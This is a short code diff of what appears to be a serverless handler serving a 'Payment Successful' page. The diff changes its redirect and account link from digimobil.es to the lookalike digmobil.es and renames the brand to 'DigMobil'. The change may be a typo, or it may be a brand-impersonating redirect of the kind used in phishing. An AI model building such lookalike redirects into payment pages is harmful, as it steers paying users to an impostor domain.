@@ -36,7 +36,7 @@ exports.handler = async (event, context) => {
   <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="refresh" content="3;url=https://www.digimobil.es/"> <!-- Redirect after 3 seconds -->
+    <meta http-equiv="refresh" content="3;url=https://www.digmobil.es/"> <!-- Redirect after 3 seconds -->
     <title>Payment Successful</title>
     <style>
       body { font-family: Arial, sans-serif; text-align: center; padding: 20px; }
@@ -49,8 +49,8 @@ exports.handler = async (event, context) => {
     <div class="container">
       <h1>Payment Successful</h1>
       <p>Your payment was processed successfully.</p>
-      <p>Redirecting to DigiMobil in 3 seconds...</p>
-      <a href="https://www.digimobil.es/" class="btn">Return to Account</a> <!-- Updated href -->
+      <p>Redirecting to DigMobil in 3 seconds...</p>
+      <a href="https://www.digmobil.es/" class="btn">Return to Account</a> <!-- Updated href -->
     </div>
   </body>
   </html>
